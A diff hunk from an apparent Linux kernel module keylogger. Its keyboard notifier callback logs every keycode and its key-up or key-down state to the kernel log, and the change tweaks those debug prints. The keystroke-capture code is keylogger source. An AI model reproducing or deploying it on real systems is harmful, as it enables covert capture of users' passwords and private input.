@@ -55,13 +55,14 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
 }
 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
-    printk("HELLO NOTIFY");
+    //printk("HELLO NOTIFY %d %d\n", code, KBD_KEYCODE);
     
     struct keyboard_notifier_param *param = _param;
+    
     struct vc_data *vc = param->vc;
 
     if (code == KBD_KEYCODE) {
-        printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+        printk("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
     }
 
     return NOTIFY_OK;
